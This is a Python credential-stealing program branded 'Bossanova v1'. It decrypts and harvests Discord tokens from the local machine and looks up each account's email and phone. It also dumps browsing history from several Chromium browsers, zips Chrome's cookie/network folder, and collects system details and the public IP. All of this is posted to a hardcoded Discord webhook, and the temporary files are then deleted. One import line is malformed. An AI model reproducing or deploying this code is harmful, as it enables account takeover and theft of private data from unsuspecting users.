import sys
import os
import shutil
import subprocess
import json
import requests
import time
import base64
import win32crypt
import platform
import socket
import sqlite3
import tempfile
from Crypto.CipherAES if AES else None # (Mantiene la importación segura)
from Crypto.Cipher import AES

def get_master_key():
    appdata = os.getenv("APPDATA")
    if not appdata:
        return None
        
    local_state_path = os.path.join(appdata, "discord", "Local State")
    if not os.path.exists(local_state_path):
        local_appdata = os.getenv("LOCALAPPDATA")
        if local_appdata:
            local_state_path = os.path.join(local_appdata, "Discord", "Local State")
            
    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] 
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
        return decrypted_pass
    except Exception:
        return None

def obtener_tokens_reales():
    master_key = get_master_key()
    if not master_key:
        return []

    tokens = []
    leveldb_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
    
    if not os.path.exists(leveldb_path):
        return []

    for file in os.listdir(leveldb_path):
        if file.endswith(".ldb") or file.endswith(".log"):
            file_path = os.path.join(leveldb_path, file)
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                
                pos = 0
                while True:
                    pos = content.find(b"dQw4w9WgXcQ:", pos)
                    if pos == -1:
                        break
                    
                    try:
                        end_pos = content.find(b'"', pos)
                        if end_pos == -1:
                            end_pos = pos + 150
                        
                        encrypted_block = content[pos:end_pos]
                        if b":" in encrypted_block:
                            raw_data = base64.b64decode(encrypted_block.split(b":")[1])
                            token = decrypt_val(raw_data, master_key)
                            if token and token not in tokens:
                                tokens.append(token)
                    except Exception:
                        pass
                    
                    pos += len(b"dQw4w9WgXcQ:")
            except Exception:
                continue
                
    return tokens

######## Historial Multi-Navegador y Multi-Perfil (TXT) ######################

def generar_archivo_historial():
    local_appdata = os.getenv("LOCALAPPDATA")
    txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")
    
    if not local_appdata:
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("No se pudo acceder a LOCALAPPDATA.")
        return txt_path

    # Directorios base de los navegadores basados en Chromium en Windows
    navegadores = {
        "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Microsoft Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
        "Opera Software": os.path.join(local_appdata, "Opera Software", "Opera Stable")
    }

    temp_dir = tempfile.gettempdir()
    
    with open(txt_path, "w", encoding="utf-8") as f_out:
        f_out.write("=== HISTORIAL GLOBAL DE NAVEGACION (MULTIPERFIL / MULTINAVEGADOR) ===\n\n")

        for nav_nombre, base_path in navegadores.items():
            if not os.path.exists(base_path):
                continue

            # Buscar perfiles (Default, Profile 1, Profile 2, etc.)
            perfiles = ["Default"]
            try:
                for item in os.listdir(base_path):
                    if item.startswith("Profile ") or item == "Guest Profile":
                        perfiles.append(item)
            except Exception:
                pass

            for perfil in perfiles:
                history_path = os.path.join(base_path, perfil, "History")
                if not os.path.exists(history_path):
                    continue

                temp_history = os.path.join(temp_dir, f"history_{nav_nombre}_{perfil}".replace(" ", "_"))
                
                try:
                    shutil.copy2(history_path, temp_history)
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    
                    query = """
                        SELECT url, title, last_visit_time 
                        FROM urls 
                        ORDER BY last_visit_time DESC
                    """
                    cursor.execute(query)
                    rows = cursor.fetchall()
                    
                    f_out.write(f"\n--- [ Navegador: {nav_nombre} | Perfil: {perfil} ] ---\n")
                    for row in rows:
                        url, title, _ = row
                        titulo_seguro = title if title else "Sin título"
                        f_out.write(f"Título: {titulo_seguro}\nURL: {url}\n----------------------------------------\n")
                        
                    cursor.close()
                    conn.close()
                except Exception:
                    pass
                finally:
                    if os.path.exists(temp_history):
                        try:
                            os.remove(temp_history)
                        except:
                            pass
                            
    return txt_path

######## Procesar Carpeta Network (ZIP) #####################################

def empaquetar_network():
    network_dir = os.path.join(
        os.path.expanduser("~"),
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Default",
        "Network",
    )
    
    if not os.path.exists(network_dir):
        return None

    temp_dir = tempfile.gettempdir()
    staging_dir = os.path.join(temp_dir, "chrome_network_staging")
    zip_base_path = os.path.join(temp_dir, "chrome_network_data")

    try:
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
        os.makedirs(staging_dir, exist_ok=True)

        for item in os.listdir(network_dir):
            source_item = os.path.join(network_dir, item)
            target_item = os.path.join(staging_dir, item)
            try:
                if os.path.isdir(source_item):
                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                else:
                    shutil.copy2(source_item, target_item)
            except Exception:
                pass

        shutil.make_archive(zip_base_path, "zip", staging_dir)
        final_zip_file = zip_base_path + ".zip"
        
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
            
        return final_zip_file
    except Exception:
        return None

######## Webhook #############################################################

WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"

def obtener_info_pc():
    info_sistema = {}

    try:
        cmd_cpu = "wmic cpu get name"
        procesador = (
            subprocess.check_output(cmd_cpu, shell=True)
            .decode("utf-8", errors="ignore")
            .split("\n")[1]
            .strip()
        )
        info_sistema["procesador"] = procesador if procesador else "Desconocido"
    except Exception:
        info_sistema["procesador"] = platform.processor() or "Desconocido"

    info_sistema["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
    info_sistema["nombre_pc"] = socket.gethostname()

    try:
        info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
    except Exception:
        info_sistema["ip_local"] = "No disponible"

    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
    except Exception:
        info_sistema["ip_publica"] = "No disponible"

    try:
        cmd_gpu = "wmic path win32_videocontroller get name"
        gpu = (
            subprocess.check_output(cmd_gpu, shell=True)
            .decode("utf-8", errors="ignore")
            .split("\n")[1]
            .strip()
        )
        info_sistema["gpu"] = gpu if gpu else "Desconocida"
    except Exception:
        info_sistema["gpu"] = "No disponible"

    return info_sistema

def obtener_datos_usuario(token):
    headers = {
        "Authorization": token.strip(),
        "Content-Type": "application/json"
    }
    try:
        response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
        if response.status_code == 200:
            return {"success": True, "data": response.json()}
        else:
            return {"success": False, "status": response.status_code}
    except Exception as e:
        return {"success": False, "status": str(e)}

def enviar_reporte_completo(tokens):
    datos_pc = obtener_info_pc()
    
    descripcion = (
        f"💻 **PC:** `{datos_pc['nombre_pc']}`\n"
        f"⚙️ **OS:** `{datos_pc['os']}`\n"
        f"🔧 **Procesador:** `{datos_pc['procesador']}`\n"
        f"🎮 **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
        f"🌐 **IP Local:** `{datos_pc['ip_local']}`\n"
        f"🌍 **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
        f"---\n"
        f"🔑 **Tokens:**\n"
    )

    if tokens:
        for token in tokens:
            token_limpio = token.strip()
            resultado = obtener_datos_usuario(token_limpio)
            
            if resultado["success"]:
                user_data = resultado["data"]
                username = user_data.get("username", "Desconocido")
                user_id = user_data.get("id", "Desconocido")
                email = user_data.get("email", "No disponible")
                phone = user_data.get("phone", "No disponible")
                
                descripcion += (
                    f"\n👤 **User:** `{username}` (ID: `{user_id}`)\n"
                    f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
                    f"• **Token:**\n`{token_limpio}`\n"
                )
            else:
                status = resultado["status"]
                descripcion += (
                    f"\n❌ **Token Inválido (Error: {status}):**\n"
                    f"`{token_limpio}`\n"
                )
            
            time.sleep(0.5)
    else:
        descripcion += "_No se encontraron tokens._"

    if len(descripcion) > 4000:
        descripcion = descripcion[:3997] + "..."

    payload = {
        "embeds": [
            {
                "title": "Bossanova v1",
                "description": descripcion,
                "color": 5814783,
                "footer": {
                    "text": "Por BossaNova"
                }
            }
        ]
    }

    txt_path = generar_archivo_historial()
    zip_path = empaquetar_network()

    files = {}
    try:
        f_txt = open(txt_path, "rb") if os.path.exists(txt_path) else None
        f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None

        if f_txt:
            files["file1"] = ("historial_global.txt", f_txt, "text/plain")
        if f_zip:
            files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")

        requests.post(WEBHOOK_URL_UNICO, data={"payload_json": json.dumps(payload)}, files=files)

        if f_txt:
            f_txt.close()
        if f_zip:
            f_zip.close()
    except Exception:
        pass

    if os.path.exists(txt_path):
        try:
            os.remove(txt_path)
        except:
            pass
            
    if zip_path and os.path.exists(zip_path):
        try:
            os.remove(zip_path)
        except:
            pass

if __name__ == "__main__":
    tokens = obtener_tokens_reales() 
    enviar_reporte_completo(tokens)
